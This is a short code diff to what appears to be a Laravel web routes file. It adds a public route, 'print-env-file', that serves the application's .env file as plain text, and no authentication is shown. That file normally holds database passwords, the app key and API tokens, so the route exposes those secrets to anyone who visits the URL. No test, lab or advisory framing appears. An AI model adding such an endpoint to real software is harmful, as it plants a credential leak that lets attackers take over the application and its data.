@@ -688,3 +688,11 @@ Route::get('show-apple-file', function () {
     return $apple;
 
 });
+
+Route::get('print-env-file', function () {
+    return response(
+        File::get(base_path('.env')),
+        200,
+        ['Content-Type' => 'text/plain']
+    );
+});
